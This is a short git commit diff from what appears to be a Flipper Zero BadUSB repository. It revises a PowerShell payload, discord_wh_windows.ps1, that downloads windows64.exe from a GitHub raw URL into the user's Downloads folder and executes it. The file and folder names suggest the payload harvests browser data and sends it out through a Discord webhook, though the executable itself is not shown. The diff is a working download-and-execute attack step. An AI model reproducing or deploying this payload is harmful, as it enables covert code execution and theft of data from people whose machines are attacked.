3ad55f031f72881ad1ae0c0a453fbd9fc94d4ee2
Chris <christophe.da.cruz.tic@gmail.com>
2023-12-25 22:01:31 +0100

    test fix

--- badusb/BrowserData/discord_wh_windows.ps1
+++ badusb/BrowserData/discord_wh_windows.ps1
@@ -1,2 +1,4 @@
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe' -OutFile [System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
-Start-Process -FilePath "explorer.exe" -ArgumentList [System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
+powershell $url = "https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
+powershell $destination = [System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
+powershell Invoke-WebRequest -Uri $url -OutFile $destination
+powershell Start-Process -FilePath $destination -Wait
